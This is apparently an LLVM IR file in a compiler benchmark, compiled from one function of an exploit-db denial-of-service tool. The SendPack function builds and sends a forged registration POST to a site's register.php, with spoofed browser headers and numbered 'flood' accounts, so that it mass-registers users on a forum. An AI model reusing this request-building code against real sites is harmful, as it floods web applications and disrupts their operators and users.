; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/php/dos/extr_1517.c_SendPack.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/php/dos/extr_1517.c_SendPack.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [32 x i8] c"Error trying to reserver memory\00", align 1
@.str.1 = private unnamed_addr constant [442 x i8] c"POST %sregister.php?action=register HTTP/1.1\0AHost: %s\0AUser-Agent: Mozilla/5.0 Gecko/20050511 Firefox/1.0.4\0AAccept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\0AAccept-Language: es-ar,es;q=0.8,en-us;q=0.5,en;q=0.3\0AAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\0AKeep-Alive: 300\0AProxy-Connection: keep-alive\0AReferer: http://%s%sregister.php\0AContent-Type: application/x-www-form-urlencoded\0A\00", align 1
@.str.2 = private unnamed_addr constant [130 x i8] c"form_sent=1&req_username=%d__NsT&req_password1=flood&req_password2=flood&req_email1=%d_peace@NsT.net&timezone=-10&email_setting=1\00", align 1
@.str.3 = private unnamed_addr constant [21 x i8] c"Content-Length: %d\0A\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @SendPack(i32 %0, i32 %1, i8* %2, i8* %3) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i8*, align 8
  %10 = alloca i8*, align 8
  %11 = alloca i8*, align 8
  store i32 %0, i32* %5, align 4
  store i32 %1, i32* %6, align 4
  store i8* %2, i8** %7, align 8
  store i8* %3, i8** %8, align 8
  %12 = call i64 @malloc(i32 2048)
  %13 = inttoptr i64 %12 to i8*
  store i8* %13, i8** %9, align 8
  %14 = icmp ne i8* %13, null
  br i1 %14, label %15, label %23

15:                                               ; preds = %4
  %16 = call i64 @malloc(i32 1024)
  %17 = inttoptr i64 %16 to i8*
  store i8* %17, i8** %10, align 8
  %18 = icmp ne i8* %17, null
  br i1 %18, label %19, label %23

19:                                               ; preds = %15
  %20 = call i64 @malloc(i32 512)
  %21 = inttoptr i64 %20 to i8*
  store i8* %21, i8** %11, align 8
  %22 = icmp ne i8* %21, null
  br i1 %22, label %27, label %23

23:                                               ; preds = %19, %15, %4
  %24 = load i32, i32* @stderr, align 4
  %25 = call i32 @fprintf(i32 %24, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str, i64 0, i64 0))
  %26 = call i32 @exit(i32 -1) #3
  unreachable

27:                                               ; preds = %19
  %28 = load i8*, i8** %9, align 8
  %29 = load i8*, i8** %7, align 8
  %30 = load i8*, i8** %8, align 8
  %31 = load i8*, i8** %8, align 8
  %32 = load i8*, i8** %7, align 8
  %33 = call i32 (i8*, i8*, ...) @sprintf(i8* %28, i8* getelementptr inbounds ([442 x i8], [442 x i8]* @.str.1, i64 0, i64 0), i8* %29, i8* %30, i8* %31, i8* %32)
  %34 = load i8*, i8** %11, align 8
  %35 = load i32, i32* %6, align 4
  %36 = load i32, i32* %6, align 4
  %37 = call i32 (i8*, i8*, ...) @sprintf(i8* %34, i8* getelementptr inbounds ([130 x i8], [130 x i8]* @.str.2, i64 0, i64 0), i32 %35, i32 %36)
  %38 = load i8*, i8** %10, align 8
  %39 = load i8*, i8** %11, align 8
  %40 = call i32 @strlen(i8* %39)
  %41 = call i32 (i8*, i8*, ...) @sprintf(i8* %38, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.3, i64 0, i64 0), i32 %40)
  %42 = load i8*, i8** %9, align 8
  %43 = load i8*, i8** %10, align 8
  %44 = call i32 @strcat(i8* %42, i8* %43)
  %45 = load i8*, i8** %9, align 8
  %46 = load i8*, i8** %11, align 8
  %47 = call i32 @strcat(i8* %45, i8* %46)
  %48 = load i32, i32* %5, align 4
  %49 = load i8*, i8** %9, align 8
  %50 = load i8*, i8** %9, align 8
  %51 = call i32 @strlen(i8* %50)
  %52 = call i32 @send(i32 %48, i8* %49, i32 %51, i32 0)
  %53 = load i8*, i8** %9, align 8
  %54 = call i32 @free(i8* %53)
  %55 = load i8*, i8** %10, align 8
  %56 = call i32 @free(i8* %55)
  %57 = load i8*, i8** %11, align 8
  %58 = call i32 @free(i8* %57)
  ret void
}

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @fprintf(i32, i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @sprintf(i8*, i8*, ...) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @strcat(i8*, i8*) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @free(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
